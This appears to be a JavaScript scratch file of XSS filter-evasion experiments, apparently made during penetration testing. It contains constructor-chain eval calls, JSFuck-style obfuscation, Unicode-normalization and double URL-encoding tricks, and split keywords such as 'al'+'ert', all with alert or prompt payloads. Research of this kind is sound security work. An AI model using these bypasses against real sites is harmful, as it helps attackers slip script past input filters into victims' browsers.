var abc = (...input) => {
  console.log(input);
  alert(input);
};
[].constructor.constructor('al' + 'ert("constructors")')();
Proxy.constructor.constructor('al' + 'ert("Proxy")')();
new Array().constructor.constructor('al' + 'ert("Array")')();
Array['constructor']["constructor"]('al' + 'ert("Array2")')();
console.log("\uFE69")
console.log("﹩")
console.log("﹩".normalize('NFKD'))
console.log("\uFE69".normalize('NFKC'))
console.log("eval(\"prompt`\u{FE69}{'normalized'}`\")".normalize('NFKD'))
// eval("prompt`${'normalized'}`")
console.log("alert\u{207D}'normalizeMe')".normalize('NFKD'))
alert('normalizeMe')
// A = '',
// B = !A + A,
// C = !B + A,
// D = A + {},
// E = B[A++],
// F = B[G = A],
// H = ++G + A,
// I = D[G + H],
// B[I += D[A] + (B.C + D)[A] + C[H] + E + F + B[G] + I + E + D[A] + F][I](C[A] + C[G] + B[H] + F + E + "(A)")()

// A = ''              // empty string
// B = !A + A          // "true"
// C = !B + A          // "false"
// D = A + {}          // "[object Object]"
// E = B[A++]          // "t" = "true"[0]
// F = B[G = A]        // "r" = "true"[1]
// H = ++G + A         // 2, 3
// I = D[G + H]        // "c"
//
// B[
//   I +=              // "c"
//     D[A] +          // "o" = "object"[0]
//     (B.C+D)[A] +    // "n" = "undefined"[1]
//     C[H] +          // "s" = "false"[3]
//     E +             // "t"
//     F +             // "r"
//     B[G] +          // "u" = "true"[2]
//     I +             // "c" = "[object]"[5]
//     E +             // "t"
//     D[A] +          // "o" = "[object]"[1]
//     F               // "r"
// ][
//   I                 // "constructor"
// ](
//   'p' +				// "p"
//   F +				// "r"
//   D[A] +			// "o"
//   'm' +				// "m"
//   'p' +				// "p"
//   E +               // "t"
//   '(A,++A)'         // "(1,2)"
// )()

// A='',B=!A+A,C=!B+A,D=A+{},E=B[A++],F=B[G=A],H=++G+A,I=D[G+H],B[I+=D[A]+(B.C+D)[A]+C[H]+E+F+B[G]+I+E+D[A]+F][I]('p'+F+D[A]+'m'+'p'+E+'(A,++A)')();

// ""["constructor"]["constructor"]("prompt(1,2)")();

// console.log(
//   (![] + [])[+!+[]] +
//     (![] + [])[!+[] + !+[]] +
//     (!![] + [])[!+[] + !+[] + !+[]] +
//     (!![] + [])[+!+[]] +
//     (!![] + [])[+[]] +
//     ([][
//       (![] + [])[+[]] +
//         (![] + [])[!+[] + !+[]] +
//         (![] + [])[+!+[]] +
//         (!![] + [])[+[]]
//     ] + [])[+!+[] + [!+[] + !+[] + !+[]]] +
//     [+!+[]] +
//     ([+[]] +
//       ![] +
//       [][
//         (![] + [])[+[]] +
//           (![] + [])[!+[] + !+[]] +
//           (![] + [])[+!+[]] +
//           (!![] + [])[+[]]
//       ])[!+[] + !+[] + [+[]]],
// );
//
// eval(
//   (![] + [])[+!+[]] +
//     (![] + [])[!+[] + !+[]] +
//     (!![] + [])[!+[] + !+[] + !+[]] +
//     (!![] + [])[+!+[]] +
//     (!![] + [])[+[]] +
//     ([][
//       (![] + [])[+[]] +
//         (![] + [])[!+[] + !+[]] +
//         (![] + [])[+!+[]] +
//         (!![] + [])[+[]]
//     ] + [])[+!+[] + [!+[] + !+[] + !+[]]] +
//     [+!+[]] +
//     ([+[]] +
//       ![] +
//       [][
//         (![] + [])[+[]] +
//           (![] + [])[!+[] + !+[]] +
//           (![] + [])[+!+[]] +
//           (!![] + [])[+[]]
//       ])[!+[] + !+[] + [+[]]],
// );

//
//
setTimeout(() => {
  // console.log(document.getElementsByName("name")[0].innerHTML);
  // var secret = document.getElementsByName("name")[0].innerHTML;
  // console.log([]);
  // console.log([][`constructor`]);
  // console.log([][`constructor`][`constructor`]);
  // console.log([][`constructor`][`constructor`]('{alert(1);return 1}')());
  // console.log([][`constructor`][`constructor`](`al` + `e` + `rt('log2')`)());
  // console.log([{} + {}]);
  // console.log([open]);
  // console.log([open + []]);
  // console.log(open + []);
  // console.log([open + ["test", {}]]);
  // console.log([open + ""]);
  // console.log([open + []][0]);
  // console.log([open + []][0][14]);
  // console.log("abc"[1]);
  // console.log(open.toString());
  // console.log(open.toString().length);
  // console.log(
  // 	`\\${`al` + [open + []][0][11] + `rt` + [open + []][0][13] + [`"`][0] + `Oneconsult` + [`"`][0] + [open + []][0][14]}`,
  // );
  // let string1 = "";
  // let string2 = "";
  // for (let i = 0; i < open.toString().length; i++) {
  // 	console.log(open.toString()[i], i);
  // 	string1 = string1 + open.toString()[i] + (i < 10 ? " " : "  ");
  // 	string2 = string2 + i + " ";
  // }
  // console.log(string1);
  // console.log(string2);
  // [][`constructor`][`constructor`]("abc" + [open + []][0][13] + "`XSS`" + [open + []][0][14],)();
  // console.log(`${`alert(\`T\`)`}`);
  // eval(`${`abc\`${`someShit`}\``}`)
  // var f = [][`constructor`][`constructor`]`a${`alert\`${`someShit`}\``}`;
  // console.log(f)
  // f``
  // [][`constructor`][`constructor`]`\`${`abc\`${`someShit2`}\``}\``();
  // abc`a${`alert\`${`someShit2`}\``}b`;

  // [][`constructor`][`constructor`](`${`al` + [open + []][0][11] + `rt` + [open + []][0][13] + "`Oneconsult`" + [open + []][0][14]}`)()

  // [][`constructor`][`constructor`]`a${`al` + [open + []][0][11] + `rt` + [open + []][0][13] + [`"`][0] + `Oneconsult` + [`"`][0] + [open + []][0][14]}```;
  // [][`constructor`][`constructor`]`var s = 'alert' + [open + []][0][13] + '2' + [open + []][0][14];[]['constructor']['constructor']('alert' + [open + []][0][13] + '2' + [open + []][0][14])()```;
  // []['constructor']['constructor']('var s = "secret";promp' + 't("something", s)')();
  // []['constructor']['constructor']`a${'var s = "secret";promp' + 't`something\u{0024}{s}`'}```;
  // console.log('\u{0024}')
  // console.log(encodeURIComponent("[]['constructor']['constructor']`a\uFE69{var s = \"secret\";promp' + 't`something\uFE69{s}`'}```"));
  // console.log("[]['constructor']['constructor']`a﹩{'var s = \"secret\";promp' + 't`something﹩{s}`'}```".normalize('NFKC'));
  // eval("[]['constructor']['constructor']`a﹩{'var s = \"secret\";promp' + 't`something﹩{s}`'}```".normalize('NFKC'));
  // alert`${1+1}`
  // alert(["",""])
  console.log("escaped: \x61");
  // prompt`${1 + 1}`
  console.log(["c", "a", "b"].toSorted());

  // alert(`${new Date()}`)
  console.log("alert(`${new Date()}`");
  // eval(
  // 	decodeURIComponent(
  // 		decodeURIComponent(
  // 			"alert%2528%2560%2524%257Bnew%2520Date%2528%2529%257D%2560%2529",
  // 		),
  // 	),
  // );
  // [][`constructor`][`constructor`]`a${'al' + [open + []][0][11] + 'rt' + [open + []][0][13] + ['"'][0] + 'Oneconsult' + ['"'][0] + [open + []][0][14]}```;
  console.log(
    encodeURIComponent(
      '[][`constructor`][`constructor`]`a\uFE69{`al`+[open+[]][0][11]+`rt`+[open+[]][0][13]+[`"`][0]+`Oneconsult`+[`"`][0]+[open+[]][0][14]}```',
    ),
  );
  console.log(encodeURIComponent('{ "body": "alert\\u0024{1}" }'));
  console.log(encodeURIComponent("alert(`${new Date()}`)"));
  console.log(encodeHTMLEntities("$"));
  const a = replaceWithHTMLCharCode("<script>alert(22)</script>");
  console.log(a);
  console.log(decodeHTMLEntities(a));
  console.log(JSON.parse('{ "body": "alert\\u0024{1}" }'));
  // console.log(JSON.stringify(encodeURIComponent('\u0024{`alert`}')))
  // console.log(encodeURIComponent('alert(`${new Date()}`)'))
  // console.log(encodeURIComponent(encodeURIComponent('alert(`${new Date()}`)')))
  // console.log(encodeURIComponent("${`alert`}"))
  // console.log(decodeURIComponent("%27%7B%60alert%60%7D"))
  // console.log('prompt')
  // prompt`now${new Date()}`
  // confirm('ola')
  // alert('ola')
  // console.log(encodeURIComponent('prompt`now${new Date()}`'))
  // console.log(encodeURIComponent(encodeURIComponent('prompt`now${new Date()}`')))
  // [][`constructor`][`constructor`]`a${'alert(1)'}```;
  // [][`constructor`][`constructor`]`a${`al` + [open + []][0][11] + `rt` + [open + []][0][13] + [`"`][0] + `Oneconsult` + [`"`][0] + [open + []][0][14]}```;
  // console.log(encodeURIComponent('[][`constructor`][`constructor`]`a\u0024{`al`+[open+[]][0][11]+`rt`+[open+[]][0][13]+[`"`][0]+`Oneconsult`+[`"`][0]+[open+[]][0][14]}```'))
  // console.log(encodeURI('[][`constructor`][`constructor`]`a${`al`+[open+[]][0][11]+`rt`+[open+[]][0][13]+[`"`][0]+`Oneconsult`+[`"`][0]+[open+[]][0][14]}```'))
  // alert(`${new Date()}`)
  // const json = JSON.stringify("alert(`${new Date()}`)")
  // console.log(json)
  // const s = encodeURIComponent(json);
  // const s = encodeURIComponent(encodeURIComponent('alert(1)'));
  // console.log(s);
  // const ss = decodeURIComponent(s);
  // console.log(ss);
  // const getjson = JSON.parse(ss);
  // console.log(getjson);
  // [][`constructor`][`constructor`](getjson.body)();

  // [][`constructor`][`constructor`]`alert(1)`();
  // const html = encodeHTMLEntities('alert`a${1}`')
  // console.log(html)
  // const clean = decodeHTMLEntities(html)
  // console.log(clean)
  //
  // const encodedStr = '<script>alert`a\u0024{1}`</script>'.replace(/[\u0000-\u9999<>\&]/g, i => '&#' + i.charCodeAt(0) + ';')
  // console.log(encodedStr)
  // const clean2 = decodeHTMLEntities(encodedStr)
  // console.log(clean2)
  // prompt`seeValueInInput${1 + 1}`;

  // var tess = 'prompt`a$' + [open + []][0][16] + '1+2' + [open + []][0][36] + '`'
  // console.log(tess);
  // eval(tess);
  // [][`constructor`][`constructor`]('pro' + 'mpt`seeValueInInput$' + [open + []][0][16] + '1+2' + [open + []][0][36] + ':`')();
  // [][`constructor`][`constructor`]('pro' + 'mpt`seeValueInInput${2+2}:`')();
  //
  function replaceWithHTMLCharCode(text) {
    return text.replace(
      /[\u0000-\u9999<>\&]/g,
      (i) => "&#" + i.charCodeAt(0) + ";",
    );
  }

  function encodeHTMLEntities(text) {
    var textArea = document.createElement("textarea");
    textArea.innerText = text;
    return textArea.innerHTML;
  }

  function decodeHTMLEntities(text) {
    var textArea = document.createElement("textarea");
    textArea.innerHTML = text;
    return textArea.value;
  }

  // console.log(encodeURIComponent('a\uFE69'))
  // console.log(encodeURIComponent('a{'))
  // console.log(encodeURIComponent('`${`alert`}'))
  // console.log('&dollar;&lcub;alert&rcub;')
  // console.log(decodeURIComponent('a%24%E2%80%A8%7Balert%7D'))
  // alert('\50abc\51')
  // alert('\x28abc\x28')
  // alert('\44def\44')
  // alert('\x24def\x24')
  // alert('\x7bghi')
  // alert('\x24ghi')
  // [][`constructor`][`constructor`](alert(1))();
  // [][`constructor`][`constructor`](`al` + `e` + `rt('1')`)();
  // [].constructor.constructor(`alert('XSS')`)();
  // eval(`al` + `e` + `rt('2')`);
  //
  //
}, 100); // alert(44)
